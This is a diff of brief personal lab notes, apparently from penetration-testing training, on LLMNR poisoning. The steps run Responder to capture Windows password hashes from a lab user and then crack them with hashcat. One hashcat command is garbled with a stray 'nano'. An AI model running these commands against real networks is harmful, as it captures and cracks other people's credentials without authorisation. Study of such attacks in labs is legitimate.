@@ -1,13 +1,12 @@
 # LMNR Poisoning
 *responder -I eth0 -rdwv does not work on newer versions, instead it is responder -I eth0 -dwv*
-1. Set up responder
-sudo responder -I eth0 -dwv
+### 1. Set up responder
+**sudo responder -I eth0 -dwv**
 *we are now listening for traffic*
-2. Go to one of the windows machines - I logged on as fcastle and point it at your attacker machine
+### 2. Go to one of the windows machines - I logged on as fcastle and point it at your attacker machine
 *this will not resolve but should let us pull down the hash*
 
-
-3. Hashcat that boy
+### 3. Use hashcat on the hash
 	1. nano hash.txt 
 		- paste your hash into this file
 	2. hashcat --identify nano hash.txt
